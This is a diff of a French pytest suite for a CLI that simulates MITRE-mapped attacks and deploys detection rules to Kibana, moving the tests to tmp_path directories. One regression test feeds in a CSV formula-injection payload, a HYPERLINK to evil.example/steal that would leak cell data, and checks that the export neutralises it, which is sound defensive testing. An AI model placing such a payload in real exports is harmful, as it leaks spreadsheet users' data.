@@ -81,44 +81,46 @@ class TestCommandeList:
         assert CATALOGUE[0].id in resultat.output
         assert CATALOGUE[0].technique_mitre in resultat.output
 
-    def test_export_csv(self, runner):
+    def test_export_csv(self, runner, tmp_path, monkeypatch):
         import csv as csv_module
 
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
-            assert resultat.exit_code == 0
-            # Le CSV doit commencer par un BOM UTF-8 (compat Excel/LibreOffice :
-            # sans lui, les accents s'affichent en mojibake "RÃ¨gle").
-            with open("catalogue.csv", "rb") as fb:
-                assert fb.read(3) == b"\xef\xbb\xbf"
-            # utf-8-sig : le BOM est retiré à la lecture, sinon la 1re colonne
-            # deviendrait "﻿id" et lignes[0]["id"] lèverait KeyError.
-            with open("catalogue.csv", encoding="utf-8-sig") as f:
-                lignes = list(csv_module.DictReader(f))
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
+        assert resultat.exit_code == 0
+        # Le CSV doit commencer par un BOM UTF-8 (compat Excel/LibreOffice :
+        # sans lui, les accents s'affichent en mojibake "RÃ¨gle").
+        with open("catalogue.csv", "rb") as fb:
+            assert fb.read(3) == b"\xef\xbb\xbf"
+        # utf-8-sig : le BOM est retiré à la lecture, sinon la 1re colonne
+        # deviendrait "﻿id" et lignes[0]["id"] lèverait KeyError.
+        with open("catalogue.csv", encoding="utf-8-sig") as f:
+            lignes = list(csv_module.DictReader(f))
         assert len(lignes) == len(CATALOGUE)
         assert lignes[0]["id"] == CATALOGUE[0].id
         assert lignes[0]["technique_mitre"] == CATALOGUE[0].technique_mitre
 
-    def test_export_csv_neutralise_une_attaque_perso_malveillante(self, runner):
+    def test_export_csv_neutralise_une_attaque_perso_malveillante(
+        self, runner, tmp_path, monkeypatch
+    ):
         """Régression sécurité (audit) : CWE-1236 -- une attaque perso (nom
         provenant d'un brouillon LLM ou saisi par l'utilisateur, source non
         fiable) ne doit jamais planter une formule Excel/LibreOffice dans le
         CSV exporté."""
         from cadre.catalogue_utilisateur import enregistrer_attaque_utilisateur
 
-        with runner.isolated_filesystem():
-            enregistrer_attaque_utilisateur(
-                {
-                    "id": "CADRE-PERSO-CSV",
-                    "nom": '=HYPERLINK("http://evil.example/steal?"&A1,"Cliquez")',
-                    "technique_mitre": "T1059.001",
-                    "tactique_mitre": "Execution",
-                    "commande": "whoami",
-                }
-            )
-            resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
-            assert resultat.exit_code == 0
-            contenu = Path("catalogue.csv").read_text(encoding="utf-8-sig")
+        monkeypatch.chdir(tmp_path)
+        enregistrer_attaque_utilisateur(
+            {
+                "id": "CADRE-PERSO-CSV",
+                "nom": '=HYPERLINK("http://evil.example/steal?"&A1,"Cliquez")',
+                "technique_mitre": "T1059.001",
+                "tactique_mitre": "Execution",
+                "commande": "whoami",
+            }
+        )
+        resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
+        assert resultat.exit_code == 0
+        contenu = Path("catalogue.csv").read_text(encoding="utf-8-sig")
         assert "'=HYPERLINK" in contenu
         assert ",=HYPERLINK" not in contenu
 
@@ -215,64 +217,62 @@ class TestCommandeInit:
 
 
 class TestCommandeCycle:
-    def test_technique_vide_refusee(self, runner):
+    def test_technique_vide_refusee(self, runner, tmp_path, monkeypatch):
         """Régression (audit) : `--technique ""` (chaîne vide) passait le
         typage click puis filtrait TOUJOURS sur technique_mitre in [""] --
         aucune attaque du catalogue n'ayant une technique vide, le cycle
         tournait silencieusement sur 0 attaque, sans jamais avertir
         l'utilisateur que son filtre ne correspond à rien."""
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--technique", "", "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--technique", "", "--simulate"])
         assert resultat.exit_code != 0
         assert "vide" in resultat.output.lower()
 
     @pytest.mark.parametrize("valeur", [0, -1, -180])
-    def test_timeout_indexation_non_positif_refuse(self, runner, valeur):
+    def test_timeout_indexation_non_positif_refuse(self, runner, valeur, tmp_path, monkeypatch):
         """Régression (audit) : `--timeout-indexation` n'était jamais validé
         -- un timeout <= 0 se propageait jusqu'à attendre_indexation(), dont
         la toute première comparaison (elapsed > timeout_max_sec) est déjà
         vraie avant le moindre appel réseau : chaque attaque du cycle serait
         silencieusement déclarée ANGLE_MORT, sans avertissement ni erreur."""
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli, ["cycle", "--timeout-indexation", str(valeur), "--simulate"]
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--timeout-indexation", str(valeur), "--simulate"])
         assert resultat.exit_code != 0
         assert "invalide" in resultat.output.lower()
 
-    def test_timeout_indexation_positif_accepte(self, runner):
+    def test_timeout_indexation_positif_accepte(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli,
-                ["cycle", "--id", attaque_id, "--timeout-indexation", "30", "--simulate"],
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli,
+            ["cycle", "--id", attaque_id, "--timeout-indexation", "30", "--simulate"],
+        )
         assert resultat.exit_code == 0
 
-    def test_id_inconnu(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", "CADRE-INCONNU-999", "--simulate"])
+    def test_id_inconnu(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", "CADRE-INCONNU-999", "--simulate"])
         assert resultat.exit_code == 1
         assert "introuvables" in resultat.output
 
-    def test_simulation_id_connu(self, runner):
+    def test_simulation_id_connu(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
         assert resultat.exit_code == 0
         assert "Simulées : 1" in resultat.output
 
-    def test_filtre_technique_ne_plante_pas(self, runner):
+    def test_filtre_technique_ne_plante_pas(self, runner, tmp_path, monkeypatch):
         """Régression : la commande Click 'list' nommait sa fonction Python
         list(), masquant le builtin dans tout cli.py — cadre cycle
         --technique appelait list(technique) qui résolvait vers cette
         commande au lieu du constructeur natif, plantant silencieusement."""
         technique = CATALOGUE[0].technique_mitre
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
         assert resultat.exit_code == 0
 
-    def test_cycle_complet_verrou_actif_message_clair(self, runner, monkeypatch):
+    def test_cycle_complet_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
         """Régression (audit) : VerrouCycleActifError levée par
         executer_cycle_complet() (branche sans --id) n'était pas rattrapée
         -- traceback Python brute au lieu d'un message clair."""
@@ -284,13 +284,15 @@ class TestCommandeCycle:
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.executer_cycle_complet", leve_verrou
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle"])
         assert resultat.exit_code != 0
         assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
         assert "déjà en cours" in resultat.output
 
-    def test_simulation_avec_llm_indisponible_degrade_proprement(self, runner, monkeypatch):
+    def test_simulation_avec_llm_indisponible_degrade_proprement(
+        self, runner, monkeypatch, tmp_path
+    ):
         """--llm avec Ollama injoignable ne doit jamais faire échouer le cycle."""
         import requests
 
@@ -302,13 +304,13 @@ class TestCommandeCycle:
 
         monkeypatch.setattr("requests.post", post_qui_echoue)
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--llm"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--llm"])
         assert resultat.exit_code == 0
         assert "Simulées : 1" in resultat.output
         assert appels_llm  # l'assistant a bien été sollicité
 
-    def test_ia_draft_regles_transmis_a_la_config(self, runner, monkeypatch):
+    def test_ia_draft_regles_transmis_a_la_config(self, runner, monkeypatch, tmp_path):
         """--ia-draft-regles doit positionner ia_brouillon_regle=True dans
         la config transmise à l'orchestrateur (désactivé par défaut)."""
         configs_captures = []
@@ -320,14 +322,14 @@ class TestCommandeCycle:
 
         monkeypatch.setattr("cadre.cli.OrchestrateurCADRE", orchestrateur_qui_capture)
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli, ["cycle", "--id", attaque_id, "--simulate", "--ia-draft-regles"]
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli, ["cycle", "--id", attaque_id, "--simulate", "--ia-draft-regles"]
+        )
         assert resultat.exit_code == 0
         assert configs_captures[0]["ia_brouillon_regle"] is True
 
-    def test_ia_draft_regles_desactive_par_defaut(self, runner, monkeypatch):
+    def test_ia_draft_regles_desactive_par_defaut(self, runner, monkeypatch, tmp_path):
         configs_captures = []
         from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur
 
@@ -337,11 +339,11 @@ class TestCommandeCycle:
 
         monkeypatch.setattr("cadre.cli.OrchestrateurCADRE", orchestrateur_qui_capture)
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
         assert configs_captures[0]["ia_brouillon_regle"] is False
 
-    def test_parallel_transmis_a_executer_cycle_complet(self, runner, monkeypatch):
+    def test_parallel_transmis_a_executer_cycle_complet(self, runner, monkeypatch, tmp_path):
         """G2 : --parallel doit atteindre executer_cycle_complet(parallele=True)
         sur le chemin catalogue/--technique (le seul qui appelle cette méthode)."""
         from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur
@@ -355,14 +357,14 @@ class TestCommandeCycle:
 
         monkeypatch.setattr(VraiOrchestrateur, "executer_cycle_complet", espion)
         technique = CATALOGUE[0].technique_mitre
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli, ["cycle", "--technique", technique, "--simulate", "--parallel"]
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli, ["cycle", "--technique", technique, "--simulate", "--parallel"]
+        )
         assert resultat.exit_code == 0
         assert captures[0]["parallele"] is True
 
-    def test_sans_parallel_flag_transmet_false(self, runner, monkeypatch):
+    def test_sans_parallel_flag_transmet_false(self, runner, monkeypatch, tmp_path):
         from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur
 
         captures = []
@@ -374,41 +376,41 @@ class TestCommandeCycle:
 
         monkeypatch.setattr(VraiOrchestrateur, "executer_cycle_complet", espion)
         technique = CATALOGUE[0].technique_mitre
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
         assert resultat.exit_code == 0
         assert captures[0]["parallele"] is False
 
-    def test_demo_avec_parallel_avertit_et_reste_sequentiel(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--demo", "--simulate", "--parallel"])
+    def test_demo_avec_parallel_avertit_et_reste_sequentiel(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--demo", "--simulate", "--parallel"])
         assert resultat.exit_code == 0
         assert "ignoré" in resultat.output
 
-    def test_id_avec_parallel_avertit_et_comportement_inchange(self, runner):
+    def test_id_avec_parallel_avertit_et_comportement_inchange(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--parallel"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--parallel"])
         assert resultat.exit_code == 0
         assert "ignoré" in resultat.output
         assert "Simulées : 1" in resultat.output
 
-    def test_revue_sans_id_refuse(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--revue"])
+    def test_revue_sans_id_refuse(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--revue"])
         assert resultat.exit_code != 0
         assert "--id" in resultat.output
 
-    def test_revue_avec_id_natif_refuse(self, runner):
+    def test_revue_avec_id_natif_refuse(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--revue"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--revue"])
         assert resultat.exit_code != 0
         assert "refusé" in resultat.output
         assert attaque_id in resultat.output
 
     def test_revue_avec_id_perso_propage_arreter_avant_deploiement(
-        self, runner, monkeypatch, exemple_attaque
+        self, runner, monkeypatch, exemple_attaque, tmp_path
     ):
         """exemple_attaque.id ('CADRE-TEST-001') n'appartient pas au
         catalogue natif -- doit passer le garde-fou et propager
@@ -428,8 +430,8 @@ class TestCommandeCycle:
             "cadre.orchestrateur.OrchestrateurCADRE.executer_attaque_complete",
             executer_qui_capture,
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
         assert resultat.exit_code == 0
         assert captures == [{"arreter_avant_deploiement": True, "source_revue": "cycle"}]
         assert "en attente de revue" in resultat.output
@@ -449,34 +451,36 @@ class TestVerrouCycleInterProcessusViaId:
     passer par executer_cycle_complet() -- sans le verrou acquis dans cette
     branche, deux `cadre cycle --id` réels (ou un et le dashboard) pouvaient
     tourner en même temps contre la même cible. `_CHEMIN_VERROU_CYCLE` est
-    relatif (./cadre_cycle.lock) : `runner.isolated_filesystem()` suffit à
-    l'isoler, pas besoin de monkeypatch dédié."""
+    relatif (./cadre_cycle.lock) : `monkeypatch.chdir(tmp_path)` (cwd isolé)
+    suffit à l'isoler, pas besoin de monkeypatch dédié sur le chemin lui-même."""
 
     @pytest.fixture(autouse=True)
     def _verrou_isole(self):
         """Surcharge locale (même nom -- priorité à la classe sur la fixture
         globale de conftest.py) : cette classe teste délibérément le chemin
         RÉEL, non redirigé (`_CHEMIN_VERROU_CYCLE` par défaut, relatif :
-        ./cadre_cycle.lock) -- `runner.isolated_filesystem()` (cwd isolé)
+        ./cadre_cycle.lock) -- `monkeypatch.chdir(tmp_path)` (cwd isolé)
         suffit ici. La fixture globale redirigerait vers tmp_path et
         casserait ces 3 tests, qui écrivent directement dans
         `Path("cadre_cycle.lock")` relatif au cwd isolé."""
 
-    def test_id_reel_refuse_si_deja_verrouille(self, runner):
+    def test_id_reel_refuse_si_deja_verrouille(self, runner, tmp_path, monkeypatch):
         """Régression (audit) : VerrouCycleActifError n'était rattrapée nulle
         part dans la CLI -- une traceback Python brute remontait à
         l'utilisateur au lieu d'un message clair. Doit maintenant échouer
         proprement (exit_code != 0, PAS d'exception qui remonte) avec un
         message actionnable affiché."""
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id])
+        monkeypatch.chdir(tmp_path)
+        Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id])
         assert resultat.exit_code != 0
         assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
         assert "déjà en cours" in resultat.output
 
-    def test_id_reel_libere_le_verrou_apres_succes(self, runner, monkeypatch, exemple_attaque):
+    def test_id_reel_libere_le_verrou_apres_succes(
+        self, runner, monkeypatch, exemple_attaque, tmp_path
+    ):
         monkeypatch.setattr("cadre.cli.catalogue_actif", lambda: [*CATALOGUE, exemple_attaque])
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.executer_attaque_complete",
@@ -486,22 +490,24 @@ class TestVerrouCycleInterProcessusViaId:
                 "rule_id_stable": "cadre-test-001",
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
-            assert resultat.exit_code == 0
-            assert not Path("cadre_cycle.lock").exists()  # libéré, jamais laissé traîner
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
+        assert resultat.exit_code == 0
+        assert not Path("cadre_cycle.lock").exists()  # libéré, jamais laissé traîner
 
-    def test_id_simulate_n_est_jamais_bloque_par_un_verrou_existant(self, runner):
+    def test_id_simulate_n_est_jamais_bloque_par_un_verrou_existant(
+        self, runner, tmp_path, monkeypatch
+    ):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
-            resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
+        monkeypatch.chdir(tmp_path)
+        Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
+        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
         assert resultat.exit_code == 0
         assert "Simulées : 1" in resultat.output
 
 
 class TestCommandeCycleDryRun:
-    def test_dry_run_liste_sans_rien_executer(self, runner, monkeypatch):
+    def test_dry_run_liste_sans_rien_executer(self, runner, monkeypatch, tmp_path):
         """--dry-run ne doit jamais instancier OrchestrateurCADRE (donc
         jamais toucher WinRM/Elasticsearch/coffre-fort)."""
 
@@ -511,22 +517,22 @@ class TestCommandeCycleDryRun:
         monkeypatch.setattr(
             "cadre.cli.OrchestrateurCADRE", orchestrateur_qui_ne_devrait_jamais_etre_appele
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--dry-run"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--dry-run"])
         assert resultat.exit_code == 0
         assert "Dry-run" in resultat.output
         assert "Aucune commande n'a été exécutée" in resultat.output
 
-    def test_dry_run_avec_id_specifique(self, runner):
+    def test_dry_run_avec_id_specifique(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", attaque_id])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", attaque_id])
         assert resultat.exit_code == 0
         assert attaque_id in resultat.output
 
-    def test_dry_run_id_inconnu_signale(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", "CADRE-INCONNU-999"])
+    def test_dry_run_id_inconnu_signale(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", "CADRE-INCONNU-999"])
         assert resultat.exit_code == 0
         assert "introuvables" in resultat.output
 
@@ -535,14 +541,14 @@ class TestCommandeRevue:
     """`cadre revue lister|approuver|rejeter` -- file d'attente de règles
     validées TP/FP mais pas encore déployées dans Kibana."""
 
-    def test_lister_vide(self, runner, monkeypatch):
+    def test_lister_vide(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr("cadre.revue_regles.lister_revues", lambda: [])
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "lister"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "lister"])
         assert resultat.exit_code == 0
         assert "Aucune règle en attente" in resultat.output
 
-    def test_lister_affiche_les_entrees(self, runner, monkeypatch):
+    def test_lister_affiche_les_entrees(self, runner, monkeypatch, tmp_path):
         entree = {
             "rule_id_stable": "cadre-ia-001",
             "technique_mitre": "T1082",
@@ -552,19 +558,19 @@ class TestCommandeRevue:
             "chemin_regle_sigma": "rules_generees/CADRE-IA-001.yml",
         }
         monkeypatch.setattr("cadre.revue_regles.lister_revues", lambda: [entree])
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "lister"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "lister"])
         assert resultat.exit_code == 0
         assert "cadre-ia-001" in resultat.output
 
-    def test_approuver_inexistant(self, runner, monkeypatch):
+    def test_approuver_inexistant(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: None)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "approuver", "cadre-inconnu"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-inconnu"])
         assert resultat.exit_code != 0
         assert "Aucune revue" in resultat.output
 
-    def test_approuver_reussi_supprime_lentree(self, runner, monkeypatch):
+    def test_approuver_reussi_supprime_lentree(self, runner, monkeypatch, tmp_path):
         entree = {"rule_id_stable": "cadre-ia-001"}
         monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
         appels_suppression = []
@@ -584,13 +590,13 @@ class TestCommandeRevue:
                 "raison": "OK",
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
         assert resultat.exit_code == 0
         assert appels_suppression == ["cadre-ia-001"]
         assert "Déployée" in resultat.output
 
-    def test_approuver_echoue_sans_forcer_entree_conservee(self, runner, monkeypatch):
+    def test_approuver_echoue_sans_forcer_entree_conservee(self, runner, monkeypatch, tmp_path):
         entree = {"rule_id_stable": "cadre-ia-001"}
         monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
         appels_suppression = []
@@ -610,13 +616,13 @@ class TestCommandeRevue:
                 "raison": "FAUX_NEGATIF",
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
         assert resultat.exit_code != 0
         assert appels_suppression == []  # l'entrée reste en attente
         assert "Non déployée" in resultat.output
 
-    def test_approuver_forcer_transmis(self, runner, monkeypatch):
+    def test_approuver_forcer_transmis(self, runner, monkeypatch, tmp_path):
         entree = {"rule_id_stable": "cadre-ia-001"}
         monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
         monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: True)
@@ -636,23 +642,23 @@ class TestCommandeRevue:
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.approuver_revue", approuver_qui_capture
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001", "--forcer"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001", "--forcer"])
         assert resultat.exit_code == 0
         assert forcer_recus == [True]
         assert "forcée" in resultat.output
 
-    def test_rejeter_existant(self, runner, monkeypatch):
+    def test_rejeter_existant(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: True)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-ia-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-ia-001"])
         assert resultat.exit_code == 0
         assert "Rejetée" in resultat.output
 
-    def test_rejeter_inexistant(self, runner, monkeypatch):
+    def test_rejeter_inexistant(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: False)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-inconnu"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-inconnu"])
         assert resultat.exit_code != 0
         assert "Aucune revue" in resultat.output
 
@@ -661,16 +667,16 @@ class TestCommandeRegle:
     """`cadre regle lire|editer|pousser` -- édition encadrée d'une règle
     DÉJÀ déployée dans Kibana."""
 
-    def test_lire_introuvable(self, runner, monkeypatch):
+    def test_lire_introuvable(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana", lambda self, rid: None
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "lire", "cadre-inconnu"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "lire", "cadre-inconnu"])
         assert resultat.exit_code != 0
         assert "Introuvable" in resultat.output
 
-    def test_lire_reussi(self, runner, monkeypatch):
+    def test_lire_reussi(self, runner, monkeypatch, tmp_path):
         donnees = {
             "name": "[CADRE] T1082 — Test",
             "type": "query",
@@ -684,21 +690,21 @@ class TestCommandeRegle:
             "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
             lambda self, rid: donnees,
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "lire", "cadre-dis-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "lire", "cadre-dis-001"])
         assert resultat.exit_code == 0
         assert "[CADRE] T1082 — Test" in resultat.output
 
-    def test_editer_introuvable_dans_kibana(self, runner, monkeypatch):
+    def test_editer_introuvable_dans_kibana(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana", lambda self, rid: None
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu"])
         assert resultat.exit_code != 0
         assert "Introuvable" in resultat.output
 
-    def test_editer_bootstrap_depuis_le_catalogue(self, runner, monkeypatch):
+    def test_editer_bootstrap_depuis_le_catalogue(self, runner, monkeypatch, tmp_path):
         """Si le fichier local n'existe pas mais l'ID correspond à une
         attaque catalogue, un YAML de départ est généré."""
         attaque_id = CATALOGUE[0].id
@@ -706,28 +712,28 @@ class TestCommandeRegle:
             "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
             lambda self, rid: {"name": "existe"},
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "editer", attaque_id.lower()])
-            assert resultat.exit_code == 0
-            assert Path(f"rules_generees/{attaque_id}.yml").is_file()
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "editer", attaque_id.lower()])
+        assert resultat.exit_code == 0
+        assert Path(f"rules_generees/{attaque_id}.yml").is_file()
 
-    def test_editer_sans_fichier_ni_attaque_demande_loption(self, runner, monkeypatch):
+    def test_editer_sans_fichier_ni_attaque_demande_loption(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
             lambda self, rid: {"name": "existe"},
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu-999"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu-999"])
         assert resultat.exit_code != 0
         assert "--fichier" in resultat.output
 
-    def test_pousser_fichier_introuvable(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
+    def test_pousser_fichier_introuvable(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
         assert resultat.exit_code != 0
         assert "Fichier introuvable" in resultat.output
 
-    def test_pousser_reussi(self, runner, monkeypatch):
+    def test_pousser_reussi(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
             lambda self, rid, yaml, pipeline="ecs_windows", forcer=False: {
@@ -739,14 +745,14 @@ class TestCommandeRegle:
                 "raison": "OK",
             },
         )
-        with runner.isolated_filesystem():
-            Path("rules_generees").mkdir()
-            Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
-            resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
+        monkeypatch.chdir(tmp_path)
+        Path("rules_generees").mkdir()
+        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
+        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
         assert resultat.exit_code == 0
         assert "Déployée" in resultat.output
 
-    def test_pousser_echoue_sans_forcer(self, runner, monkeypatch):
+    def test_pousser_echoue_sans_forcer(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
